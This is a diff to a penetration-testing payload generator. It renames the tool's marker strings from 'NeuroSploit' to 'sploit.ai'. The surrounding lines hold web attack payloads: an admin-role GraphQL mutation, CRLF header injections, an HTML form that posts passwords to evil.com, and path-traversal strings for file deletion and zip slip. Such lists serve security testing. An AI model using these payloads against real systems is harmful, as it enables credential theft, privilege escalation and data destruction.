@@ -1,5 +1,5 @@
 """
-NeuroSploit v3 - Dynamic Payload Generator
+sploit.ai - Dynamic Payload Generator
 
 Generates context-aware payloads for vulnerability testing.
 """
@@ -613,7 +613,7 @@ class PayloadGenerator:
                 '{"query":"mutation{updateUser(role:\\"admin\\"){id}}"}',
             ],
             "crlf_injection": [
-                "%0d%0aX-Injected:neurosploit", "%0d%0aSet-Cookie:evil=1",
+                "%0d%0aX-Injected:sploitai", "%0d%0aSet-Cookie:evil=1",
                 "%0d%0a%0d%0a<html>injected", "\\r\\nX-Test:1",
                 "%0d%0aLocation:http://evil.com",
             ],
@@ -638,7 +638,7 @@ class PayloadGenerator:
                 "\\x1b[31mRED_TEXT",
             ],
             "html_injection": [
-                "<h1>INJECTED</h1>", "<b>neurosploit_test</b>",
+                "<h1>INJECTED</h1>", "<b>sploitai_test</b>",
                 "<img src=x>", "<form action='http://evil.com'><input name=pw><input type=submit>",
                 "<a href='http://evil.com'>Click Here</a>",
             ],
@@ -672,7 +672,7 @@ class PayloadGenerator:
             ],
             "arbitrary_file_delete": [
                 "../../../tmp/test_delete", "../../.htaccess",
-                "../../../tmp/neurosploit_test",
+                "../../../tmp/sploitai_test",
             ],
             "zip_slip": [
                 "../../tmp/zipslip_test.txt",
